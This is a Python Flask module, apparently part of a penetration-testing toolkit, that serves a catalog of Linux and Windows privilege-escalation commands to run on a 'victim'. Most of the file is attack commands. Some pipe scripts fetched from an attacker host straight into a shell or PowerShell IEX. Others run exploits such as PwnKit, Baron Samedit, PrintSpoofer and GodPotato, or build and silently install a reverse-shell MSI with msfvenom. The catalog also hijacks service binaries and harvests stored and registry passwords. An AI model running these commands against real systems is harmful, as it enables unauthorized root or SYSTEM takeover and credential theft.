"""Privilege escalation module for ZeroCool.

A catalog of Linux and Windows privesc techniques. Each item carries:

  * target[]  — commands to run ON the victim (shown with copy buttons),
  * stage     — an optional command run IN ZeroCool (logged) that drops a tool
                into the loot dir so the File Transfer server can serve it,
  * notes     — short guidance / CVE refs.

Commands are templated with engagement-derived values, substituted client-side
so one IP/port/loot/LPORT bar updates every snippet:
  {ip}    attacker IP            {port}  file-server port
  {lport} reverse-shell port     {loot}  loot/output dir
  {tip}   target IP

Run a quick scan, catch a shell (Reverse Shells), serve tools (File Transfer),
then work this list. Pairs with the LinPEAS/WinPEAS/PowerUp fetchers on the
Dependencies page.
"""

from __future__ import annotations

from flask import Blueprint, render_template

import storage

privesc_bp = Blueprint("privesc", __name__)

# Canonical release URLs used by the "stage" actions.
LINPEAS = "https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh"
WINPEAS = "https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe"
PSPY = "https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64"
LSE = "https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh"
LES = "https://raw.githubusercontent.com/The-Z-Labs/linux-exploit-suggester/master/linux-exploit-suggester.sh"
POWERUP = "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1"
PRINTSPOOFER = "https://github.com/itm4n/PrintSpoofer/releases/latest/download/PrintSpoofer64.exe"
GODPOTATO = "https://github.com/BeichenDream/GodPotato/releases/latest/download/GodPotato-NET4.exe"


def _stage(url, name):
    return f"mkdir -p {{loot}} && curl -sL {url} -o {{loot}}/{name} && echo staged {{loot}}/{name}"


LINUX = [
    {"cat": "Enumeration", "items": [
        {"label": "Quick wins (manual)", "desc": "First things to check by hand.",
         "target": ["id; sudo -l 2>/dev/null; uname -a; cat /etc/os-release; hostname; ip a"]},
        {"label": "LinPEAS", "desc": "The all-in-one Linux enumerator.",
         "stage": _stage(LINPEAS, "linpeas.sh"),
         "target": ["curl -s http://{ip}:{port}/linpeas.sh | sh",
                    "wget -qO- http://{ip}:{port}/linpeas.sh | sh"],
         "notes": ["Stage it, serve {loot} from File Transfer, then run on target."]},
        {"label": "linux-smart-enumeration (lse)", "desc": "Quieter, level-based enum.",
         "stage": _stage(LSE, "lse.sh"),
         "target": ["curl -s http://{ip}:{port}/lse.sh | bash -s -- -l1"]},
        {"label": "pspy (watch cron/processes)", "desc": "See processes & cron without root.",
         "stage": _stage(PSPY, "pspy64"),
         "target": ["curl -s http://{ip}:{port}/pspy64 -o /tmp/pspy; chmod +x /tmp/pspy; /tmp/pspy"]},
    ]},
    {"cat": "SUID / SGID / Capabilities", "items": [
        {"label": "SUID binaries", "desc": "Cross-check hits against GTFOBins.",
         "target": ["find / -perm -4000 -type f 2>/dev/null"]},
        {"label": "SGID binaries", "desc": "",
         "target": ["find / -perm -2000 -type f 2>/dev/null"]},
        {"label": "File capabilities", "desc": "cap_setuid=ep etc. are gold.",
         "target": ["/usr/sbin/getcap -r / 2>/dev/null"]},
    ]},
    {"cat": "Sudo", "items": [
        {"label": "Sudo rights", "desc": "Map each allowed binary to GTFOBins.",
         "target": ["sudo -l"]},
        {"label": "Baron Samedit (CVE-2021-3156)", "desc": "Heap overflow in sudo < 1.9.5p2.",
         "target": ["sudo --version | head -1", "sudoedit -s '\\' $(python3 -c 'print(\"A\"*200)')"],
         "notes": ["A crash from the 2nd command suggests vulnerable. Exploit: blasty-vs-sudo / CVE-2021-3156."]},
        {"label": "PwnKit (CVE-2021-4034)", "desc": "polkit pkexec local root, near-universal.",
         "target": ["pkexec --version",
                    "curl -s http://{ip}:{port}/PwnKit -o /tmp/pk; chmod +x /tmp/pk; /tmp/pk"],
         "notes": ["Stage a compiled PwnKit (ly4k/PwnKit) into {loot} as 'PwnKit' to use the 2nd line."]},
    ]},
    {"cat": "Kernel exploits", "items": [
        {"label": "Kernel / distro version", "desc": "",
         "target": ["uname -a; cat /proc/version; cat /etc/os-release"]},
        {"label": "linux-exploit-suggester", "desc": "Maps the kernel to known exploits.",
         "stage": _stage(LES, "les.sh"),
         "target": ["curl -s http://{ip}:{port}/les.sh | bash"]},
        {"label": "DirtyPipe (CVE-2022-0847)", "desc": "Arbitrary file overwrite, kernel 5.8–5.16.11.",
         "target": ["uname -r"],
         "notes": ["If kernel in range: AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits."]},
    ]},
    {"cat": "Cron / timers", "items": [
        {"label": "Cron jobs & timers", "desc": "Look for writable scripts or wildcards.",
         "target": ["cat /etc/crontab; ls -la /etc/cron* /var/spool/cron 2>/dev/null; systemctl list-timers --all"]},
    ]},
    {"cat": "Writable / PATH / NFS", "items": [
        {"label": "World-writable files & dirs", "desc": "",
         "target": ["find / -writable -type f 2>/dev/null | grep -vE '^/(proc|sys)'",
                    "find / -perm -222 -type d 2>/dev/null"]},
        {"label": "NFS no_root_squash", "desc": "Mount, drop a SUID root binary.",
         "target": ["cat /etc/exports 2>/dev/null", "showmount -e {tip}"]},
    ]},
    {"cat": "Groups / containers", "items": [
        {"label": "Dangerous group membership", "desc": "docker / lxd / disk / adm.",
         "target": ["id"]},
        {"label": "docker group → root", "desc": "Mount host fs in a container.",
         "target": ["docker run -v /:/mnt --rm -it alpine chroot /mnt sh"]},
        {"label": "disk group → read raw fs", "desc": "",
         "target": ["df -h", "debugfs /dev/sda1"]},
    ]},
]

WINDOWS = [
    {"cat": "Enumeration", "items": [
        {"label": "Quick wins (manual)", "desc": "Privileges, host info, users.",
         "target": ["whoami /all & systeminfo & net user & net localgroup administrators"]},
        {"label": "WinPEAS", "desc": "The all-in-one Windows enumerator.",
         "stage": _stage(WINPEAS, "winPEASx64.exe"),
         "target": ["curl http://{ip}:{port}/winPEASx64.exe -o %TEMP%\\wp.exe & %TEMP%\\wp.exe",
                    "powershell -c \"IWR http://{ip}:{port}/winPEASx64.exe -OutFile $env:TEMP\\wp.exe; & $env:TEMP\\wp.exe\""]},
        {"label": "PowerUp (Invoke-AllChecks)", "desc": "PowerShell privesc checks.",
         "stage": _stage(POWERUP, "PowerUp.ps1"),
         "target": ["powershell -ep bypass -c \"IEX(IWR http://{ip}:{port}/PowerUp.ps1 -UseBasicParsing); Invoke-AllChecks\""]},
    ]},
    {"cat": "Token privileges (Potato)", "items": [
        {"label": "Check privileges", "desc": "SeImpersonate / SeAssignPrimaryToken → Potato.",
         "target": ["whoami /priv"]},
        {"label": "PrintSpoofer", "desc": "SeImpersonate → SYSTEM (Win10/2019).",
         "stage": _stage(PRINTSPOOFER, "PrintSpoofer64.exe"),
         "target": ["curl http://{ip}:{port}/PrintSpoofer64.exe -o %TEMP%\\ps.exe & %TEMP%\\ps.exe -i -c cmd"]},
        {"label": "GodPotato", "desc": "SeImpersonate → SYSTEM (broad .NET coverage).",
         "stage": _stage(GODPOTATO, "GodPotato.exe"),
         "target": ["%TEMP%\\GodPotato.exe -cmd \"cmd /c whoami\""],
         "notes": ["JuicyPotato for older builds (< Win10 1809 / Server 2019)."]},
    ]},
    {"cat": "Services", "items": [
        {"label": "Unquoted service paths", "desc": "Plant a binary in a space-containing path.",
         "target": ["wmic service get name,displayname,pathname,startmode | findstr /i /v \"C:\\Windows\\\\\" | findstr /i /v \"\"\"\""]},
        {"label": "Weak service permissions", "desc": "accesschk for writable services.",
         "target": ["accesschk.exe /accepteula -uwcqv \"Everyone\" *",
                    "sc qc <service>", "sc config <service> binpath= \"C:\\path\\evil.exe\""]},
    ]},
    {"cat": "AlwaysInstallElevated", "items": [
        {"label": "Check both keys", "desc": "Both must be 1 to abuse.",
         "target": ["reg query HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
                    "reg query HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated"]},
        {"label": "Build & run malicious MSI", "desc": "Stage builds it into loot; run on target.",
         "stage": "mkdir -p {loot} && msfvenom -p windows/x64/shell_reverse_tcp LHOST={ip} LPORT={lport} -f msi -o {loot}/evil.msi && echo built {loot}/evil.msi",
         "target": ["curl http://{ip}:{port}/evil.msi -o %TEMP%\\e.msi & msiexec /quiet /qn /i %TEMP%\\e.msi"]},
    ]},
    {"cat": "Stored credentials", "items": [
        {"label": "Saved creds & runas", "desc": "",
         "target": ["cmdkey /list", "runas /savecred /user:administrator cmd"]},
        {"label": "GPP / registry passwords", "desc": "cpassword in SYSVOL, autologon.",
         "target": ["findstr /S /I cpassword \\\\%USERDNSDOMAIN%\\SYSVOL\\*.xml",
                    "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultPassword",
                    "reg query HKLM /f password /t REG_SZ /s"]},
    ]},
    {"cat": "Scheduled tasks / autoruns", "items": [
        {"label": "Scheduled tasks", "desc": "Look for writable task binaries.",
         "target": ["schtasks /query /fo LIST /v"]},
        {"label": "Autorun weak perms", "desc": "Check autoruns then accesschk the binary.",
         "target": ["reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                    "accesschk.exe /accepteula -wvu \"C:\\path\\autorun.exe\""]},
    ]},
]

CATALOG = {"linux": LINUX, "windows": WINDOWS}


@privesc_bp.route("/privesc")
def privesc():
    eng = storage.load_engagement()
    return render_template("privesc.html", eng=eng, catalog=CATALOG)
